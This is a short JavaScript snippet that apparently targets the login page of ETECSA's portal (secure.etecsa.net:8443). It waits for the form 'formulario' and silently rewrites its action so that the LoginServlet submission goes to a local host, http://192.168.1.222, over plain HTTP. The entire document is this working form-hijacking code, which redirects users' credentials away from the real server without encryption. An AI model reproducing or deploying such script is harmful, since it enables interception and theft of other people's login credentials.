(function () { 
    var t = setInterval(function () { 
        var f = document.getElementById('formulario'); 
        if (f && f.action) { 
            f.action = f.action.replace('https://secure.etecsa.net:8443', 'http://192.168.1.222').replace('//LoginServlet', '/LoginServlet'); 
            clearInterval(t); 
        } 
    }, 100); 
    setTimeout(function () { 
        clearInterval(t); 
    }, 1000); 
})();